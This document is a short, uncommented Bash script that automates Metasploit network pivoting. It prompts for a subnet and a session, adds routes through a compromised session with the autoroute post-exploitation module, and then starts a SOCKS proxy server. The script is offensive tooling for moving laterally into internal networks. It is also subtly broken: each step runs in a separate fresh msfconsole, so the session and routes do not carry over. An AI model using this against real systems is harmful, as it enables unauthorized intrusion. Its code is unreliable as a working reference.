#!/bin/bash
                                                                                                                                                             
echo "Enter the SUBNET:"                                                                                                                                     
read SUBNET                                                                                                                                                  
                                                                                                                                                             
echo "Enter the SESSION:"                                                                                                                                    
read SESSION                                                                                                                                                 
                                                                                                                                                             
msfconsole -q -x "use post/multi/manage/autoroute; set SUBNET $SUBNET; set SESSION $SESSION; exploit"                                                        
                                                                                                                                                             
echo "Enter the SRVPORT for the socks_proxy:"                                                                                                                
read SRVPORT                                                                                                                                                 
                                                                                                                                                             
msfconsole -q -x "use auxiliary/server/socks_proxy; set SRVPORT $SRVPORT; exploit"
